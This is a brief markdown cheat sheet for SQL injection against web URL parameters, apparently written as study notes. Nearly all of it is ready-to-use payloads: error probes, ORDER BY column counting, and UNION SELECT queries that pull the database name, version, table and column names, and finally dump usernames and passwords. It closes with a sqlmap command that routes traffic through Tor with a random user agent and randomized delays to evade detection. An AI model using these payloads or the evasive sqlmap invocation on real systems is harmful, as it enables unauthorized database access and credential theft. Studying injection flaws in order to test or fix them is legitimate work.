# SQL Injection

## Error Based injection

### Testing to get a database Error

```sql
> http://blabla.com?id=1\
> http://blabla.com?id=1'
```

### Sql comment to correct the error

```sql
# + is the encode of space
> http://blabla.com?id=1\--+
> http://blabla.com?id=1'#
```

## join queries

### To see how many columns used in this query

```sql
# 3 is our guess for used columns
> http://blabla.com?id=1' order by 3 --+
```

### Reading data from database

```sql
# We usually get the output for one query only,
# So we should get rid of the first query by searching for
# a non exist value like -1
> http://blabla.com?id=-1' union all select 1,2,3 --+
```

### Getting database name and version

```sql
> http://blabla.com?id=-1' union all select 1,database(),version() --+
```

### Getting table name

```sql
# database name = security
> http://blabla.com?id=-1' union all select 1,table_name,3 from information_schema.tables where table_schema='security' --+
```

### Getting all tables names

```sql
# database name = security
> http://blabla.com?id=-1' union all select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+
```

### Getting  table columns

```sql
> http://blabla.com?id=-1' union all select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+
```

### Dumping all table data

```sql
> http://blabla.com?id=-1' union all select 1,group_concat(username),group_concat(password) from users --+
```

### No quote injection

It is the same as with quote injection but using \ instead of ' for error detection and not using any thing in injection itself

### Using SqlMap

```shell
> sqlmap -u URl -data DataToSentInPost -p PARAMETER(id) --level 3 risk 3 -random-agent --tor --check-tor --delay=500 --randomize=delay
```
